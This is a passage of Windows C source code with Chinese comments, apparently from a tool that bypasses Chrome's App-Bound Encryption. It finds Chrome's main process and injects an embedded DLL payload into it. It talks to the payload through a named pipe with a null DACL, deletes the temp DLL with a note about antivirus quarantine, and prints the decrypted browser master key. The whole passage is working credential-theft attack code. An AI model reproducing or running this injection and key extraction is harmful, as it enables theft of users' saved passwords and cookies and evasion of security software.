    // ── 读取加密密钥 ─────────────────────────────────────────
    SIZE_T encKeyLen=0;
    BYTE *encKey=ReadEncryptedKey(&encKeyLen);
    if (!encKey) {
        DeleteFileW(tempDllPath);
        return 1;
    }

    // ── 生成命名管道名称（带 GUID，避免与其他实例冲突）────────
    GUID guid; CoCreateGuid(&guid);
    wchar_t pipeName[128];
    swprintf_s(pipeName,128,L"\\\\.\\pipe\\abe_%08X%04X",guid.Data1,guid.Data2);
    wprintf(L"[*] 命名管道: %s\n",pipeName);

    // ── 创建命名管道 ─────────────────────────────────────────
    HANDLE hPipe=CreateNullDaclPipe(pipeName);
    if (hPipe==INVALID_HANDLE_VALUE) {
        DeleteFileW(tempDllPath); free(encKey); return 1;
    }
    wprintf(L"[+] 命名管道已创建\n");

    // ── 查找 Chrome 主进程 ───────────────────────────────────
    DWORD chromePid=FindChromeBrowserPid();
    if (!chromePid) {
        CloseHandle(hPipe); DeleteFileW(tempDllPath); free(encKey); return 1;
    }
    wprintf(L"[+] Chrome 主进程 PID: %lu\n",chromePid);

    // ── 执行注入 ─────────────────────────────────────────────
    BOOL ok=InjectFromEmbedded(chromePid,tempDllPath,pipeName,encKey,encKeyLen);

    // ── 清理临时 DLL 文件 ────────────────────────────────────
    // 无论注入是否成功，立即删除临时文件
    if (DeleteFileW(tempDllPath))
        wprintf(L"[+] 临时文件已清除\n");
    else
        wprintf(L"[!] 临时文件清除失败（可能已被 AV 隔离）: %s\n",tempDllPath);

    if (!ok) {
        CloseHandle(hPipe); free(encKey); return 1;
    }

    // ── 等待 payload 连接并读取结果 ──────────────────────────
    wprintf(L"[*] 等待 payload 连接（最多 15 秒）...\n");
    if (!WaitForPipeClient(hPipe,15000)) {
        wprintf(L"[-] 超时\n");
        CloseHandle(hPipe); free(encKey); return 1;
    }
    wprintf(L"[+] Payload 已连接\n");

    DWORD decLen=0,rd=0;
    if (!ReadFile(hPipe,&decLen,sizeof(DWORD),&rd,NULL)||rd!=sizeof(DWORD)||decLen==0||decLen>1024) {
        wprintf(L"[-] 读取长度前缀失败\n");
        CloseHandle(hPipe); free(encKey); return 1;
    }

    BYTE *decKey=(BYTE*)malloc(decLen);
    ReadFile(hPipe,decKey,decLen,&rd,NULL);
    CloseHandle(hPipe); free(encKey);

    wprintf(L"\n[+] 解密成功！明文密钥（%lu 字节）:\n",decLen);
    for (DWORD i=0;i<decLen;i++) {
        wprintf(L"%02X ",decKey[i]);
        if((i+1)%16==0) wprintf(L"\n");
    }
    wprintf(L"\n");
    free(decKey);
    return 0;
}
